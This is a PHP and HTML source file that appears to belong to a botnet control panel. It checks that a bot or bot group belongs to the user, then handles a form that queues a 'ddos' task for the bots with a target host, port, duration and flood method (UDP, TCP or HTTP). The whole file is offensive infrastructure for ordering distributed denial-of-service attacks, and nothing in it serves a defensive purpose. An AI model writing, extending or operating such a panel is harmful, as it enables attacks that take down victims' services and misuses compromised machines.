<?php
     $param = array();
     @$curr_group = $group->GetData($_GET['group']);
     if(empty($curr_group)){
         
         $curr_bot = $bots->GetData($_GET['bot']); 
         $curr_user = $user->GetData($curr_bot['USER_TOKEN']);
         if(!$bots->UserMatch($curr_bot['TOKEN'], $curr_user['TOKEN'])){
             die();
         }else{
             $param['BOT_TOKEN'] = $curr_bot['TOKEN'];
         }
     
     }

if (isset($_POST['AddTask'])) {
    if ($_POST['p'] == "add_task") {
        if ($_GET['type'] == "ddos") {

            $param['USER_TOKEN'] = $curr_user['TOKEN'];

            $param['EXPIRE'] = $_POST['expiredate'];
            $param['TYPE'] = $_GET['type'];
            $param['GROUP_TOKEN'] = $curr_group['TOKEN'];
            if (isset($_POST['runonce'])) {
                $param['RUN_ONCE'] = "true";
            } else {
                $param['RUN_ONCE'] = "false";
            }
            if (isset($_POST['status'])) {
                $param['STATUS'] = "true";
            } else {
                $param['STATUS'] = "false";
            }
            //*Custum data
                $param['ARG_ARRAY']["DURATION"] = @$_POST['duration'];
                $param['ARG_ARRAY']["HOST"] = @$_POST['host'];
                $param['ARG_ARRAY']["PORT"] = @$_POST['port'];
                $param['ARG_ARRAY']["METHOD"] = @$_POST['method'];
                var_dump($param);
                $tasks->Add($param);
        }
    }
}

?>
<div class="form-check d-flex gap-4">

    <div class="form-check">
        <input class="form-check-input" type="checkbox" value="" id="runonce" name="runonce" checked>
        <label class="form-check-label" for="runonce">
            Run Once
        </label>
    </div>
    <div class="form-check">
        <input class="form-check-input" type="checkbox" value="" id="status" name="status" checked>
        <label class="form-check-label" for="status">
            Status
        </label>
    </div>
</div>
<hr>
<h6>Expire date</h6>
<div class="input-group">
    <span class="input-group-text"><i class="fa-light fa-info"></i></span>
    <input type="datetime-local" name="expiredate" class="form-control" placeholder="Default" value="Default">
</div>
<br>
<h6>Duration (sec)</h6>
<div class="input-group">
    <span class="input-group-text"><i class="fa-light fa-info"></i></span>
    <input type="number" name="duration" class="form-control" placeholder="Duration" value="Duration">
</div>
<br>
<h6>Host</h6>
<div class="input-group">
    <span class="input-group-text"><i class="fa-light fa-info"></i></span>
    <input type="text" name="host" class="form-control" placeholder="host" value="host">
</div>
<br>
<h6>Port</h6>
<div class="input-group">
    <span class="input-group-text"><i class="fa-light fa-info"></i></span>
    <input type="number" name="port" class="form-control" placeholder="port" value="port">
</div>
<br>
<h6>Method</h6>
<div class="input-group">
    <span class="input-group-text"><i class="fa-light fa-info"></i></span>
    <select class="form-select" name="method" aria-label="method">
        <option value="UDP">UDP</option>
        <option value="TCP">TCP</option>
        <option value="HTTP">HTTP</option>
    </select>
</div>
</div>

<hr>